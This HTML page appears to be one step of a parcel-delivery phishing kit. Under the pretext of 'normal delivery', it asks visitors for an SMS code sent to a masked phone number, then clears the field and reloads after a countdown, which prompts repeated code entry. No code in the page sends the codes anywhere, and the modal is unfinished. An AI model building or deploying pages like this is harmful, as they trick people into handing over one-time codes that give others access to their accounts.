<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>Third page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
      crossorigin="anonymous"
    />
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3"
      crossorigin="anonymous"
    ></script>
    <link
      rel="stylesheet"
      type="text/css"
      media="screen"
      href="css/page3.css"
    />
  </head>

  <body>
    <div class="container p-3">
      <div class="p-3">
        <h5>Verify Telephone</h5>
        <span
          >To ensure normal delivery, need to verify your mobile phone
          number.</span
        >
        <div class="form-group mt-1">
          <div class="input-group mb-3">
            <input
              type="text"
              class="form-control"
              id="sms_code"
              placeholder="Text Code To XXX-XX-9400"
              style="border-radius: 0px"
            />
          </div>
          <div class="d-flex justify-content-center">
            <input
              class="mt-3"
              id="button_text"
              type="submit"
              onclick="send()"
              value="Send"
              data-bs-toggle="modal"
              data-bs-target="#staticBackdrop"
            />
          </div>
          <div id="counter"></div>
        </div>
      </div>
    </div>

    <!-- Modal -->
    <div
      class="modal fade"
      id="staticBackdrop"
      data-bs-backdrop="static"
      data-bs-keyboard="false"
      tabindex="-1"
      aria-labelledby="staticBackdropLabel"
      aria-hidden="true"
    >
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h1 class="modal-title fs-5" id="staticBackdropLabel">
              Modal title
            </h1>
            <button
              type="button"
              class="btn-close"
              data-bs-dismiss="modal"
              aria-label="Close"
            ></button>
          </div>
          <div class="modal-body">
            <div class="form-group mt-1">
                <div class="input-group mb-3">
                  <input
                    type="text"
                    class="form-control"
                    style="border-radius: 0px"
                  />
                  <span
                    class="input-group-text"
                    id="countTime"
                    style="background-color: white; border-radius: 0; display: none"
                  ></span>
                </div>
          </div>
          <div class="modal-footer">
            <button
              type="button"
              class="btn btn-secondary"
              data-bs-dismiss="modal"
            >
              Close
            </button>
            <button type="button" class="btn btn-primary">Verify</button>
          </div>
        </div>
      </div>
    </div>
  </body>
  <script type="text/javascript">
    function send() {
      const sms_code_text = document.getElementById("sms_code").value;

      if (sms_code_text == "") {
      } else {
        document.getElementById("button_text").value = "Continue";

        document.getElementById("countTime").style.display = "block";
        document.getElementById("sms_code").value = "";
        let counter = 3;
        setInterval(() => {
          document.getElementById("countTime").innerHTML = counter;
          counter--;
          if (counter < 0) window.location.reload();
        }, 1000);
      }
    }
  </script>
</html>
